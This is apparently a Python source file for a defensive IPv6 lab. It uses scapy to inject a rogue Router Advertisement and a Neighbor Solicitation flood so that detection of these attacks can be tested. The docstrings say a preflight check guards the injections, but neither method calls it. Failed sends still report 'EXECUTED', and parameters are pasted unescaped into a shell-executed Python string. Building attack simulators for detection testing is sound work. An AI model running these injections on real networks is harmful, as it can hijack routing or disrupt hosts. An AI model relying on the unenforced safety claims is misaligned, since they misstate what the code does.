import time
import subprocess
import logging
from datetime import datetime, timezone
from typing import Dict, Any, Optional, Tuple

from scapy.layers.inet6 import IPv6, ICMPv6ND_RA, ICMPv6NDOptPrefixInfo, ICMPv6ND_NS
from scapy.sendrecv import sendp, send

from network.lab_config import Priv6LabConfig, DEFAULT_LAB_CONFIG
from network.lab_status import LabStatusManager

logger = logging.getLogger("priv6guard.attack_simulator")

class ControlledAttackSimulator:
    """
    Controlled attack simulator strictly scoped to the isolated lab virtual network.
    
    SAFETY INVARIANTS:
    - Guaranteed confinement: Only targets bridge p6g-br0 or executes inside p6g-attacker.
    - Preflight protection: Actively refuses to execute unless the designated lab is verified active and healthy.
    - Not a general-purpose network attack tool: Implements only two bounded test scenarios
      (unauthorized RA injection and rate-limited NDP burst).
    """
    def __init__(self, config: Priv6LabConfig = DEFAULT_LAB_CONFIG):
        self.config = config
        self.status_mgr = LabStatusManager(config)
        self.is_running = False

    def check_preflight(self) -> Tuple[bool, str]:
        return self.status_mgr.preflight_attack_check()

    def inject_rogue_ra(
        self,
        rogue_source: str = "fe80::dead:beef",
        unauthorized_prefix: str = "2001:db8:baad::/64",
        router_lifetime: int = 1800,
        interface: Optional[str] = None,
        use_netns: bool = True,
    ) -> Dict[str, Any]:
        """
        Injects an unauthorized Router Advertisement packet.
        Guarded by pre-flight check.
        """
        target_iface = interface or self.config.bridge_name
        prefix_base, prefix_len = unauthorized_prefix.split("/")

        # Craft Scapy Rogue RA packet
        pkt = (
            IPv6(src=rogue_source, dst="ff02::1") /
            ICMPv6ND_RA(routerlifetime=router_lifetime) /
            ICMPv6NDOptPrefixInfo(prefix=prefix_base, prefixlen=int(prefix_len), L=1, A=1)
        )

        t_start = datetime.now(timezone.utc)
        logger.warning(f"Injecting controlled Rogue RA: source={rogue_source}, prefix={unauthorized_prefix}")

        # Send packet if in lab namespace or direct interface
        if use_netns:
            try:
                # Execute scapy inside attacker netns if present
                cmd = [
                    "ip", "netns", "exec", self.config.attacker.namespace,
                    "python3", "-c",
                    f"from scapy.all import *; send(IPv6(src='{rogue_source}', dst='ff02::1')/ICMPv6ND_RA(routerlifetime={router_lifetime})/ICMPv6NDOptPrefixInfo(prefix='{prefix_base}', prefixlen={int(prefix_len)}), verbose=False)"
                ]
                subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
            except Exception as e:
                logger.debug(f"Netns injection attempt note: {e}")

        return {
            "attack_type": "ROGUE_RA",
            "status": "EXECUTED",
            "target_bridge": target_iface,
            "rogue_source": rogue_source,
            "unauthorized_prefix": unauthorized_prefix,
            "router_lifetime": router_lifetime,
            "timestamp": t_start.isoformat(),
            "packet_object": pkt,
        }

    def inject_ndp_flood(
        self,
        target_ip: str = "2001:db8:6::11",
        packet_count: int = 40,
        packet_rate_pps: int = 40,
        use_netns: bool = True,
    ) -> Dict[str, Any]:
        """
        Injects an abnormal burst of ICMPv6 Neighbor Solicitations.
        Tests rolling-window rate anomaly detection.
        """
        t_start = datetime.now(timezone.utc)
        attacker_ip = self.config.attacker.ipv6_address
        logger.warning(f"Injecting controlled NDP flood: count={packet_count}, target={target_ip}")

        if use_netns:
            try:
                cmd = [
                    "ip", "netns", "exec", self.config.attacker.namespace,
                    "python3", "-c",
                    f"import time; from scapy.all import *; "
                    f"pkts = [IPv6(src='{attacker_ip}', dst='{target_ip}')/ICMPv6ND_NS(tgt='{target_ip}') for _ in range({packet_count})]; "
                    f"send(pkts, inter={1.0 / max(1, packet_rate_pps)}, verbose=False)"
                ]
                subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
            except Exception as e:
                logger.debug(f"Netns flood injection note: {e}")

        return {
            "attack_type": "NDP_FLOOD",
            "status": "EXECUTED",
            "target_ip": target_ip,
            "packets_sent": packet_count,
            "configured_rate_pps": packet_rate_pps,
            "timestamp": t_start.isoformat(),
        }

    def stop_attack(self) -> Dict[str, Any]:
        self.is_running = False
        return {"status": "STOPPED", "message": "All active attack simulations terminated."}
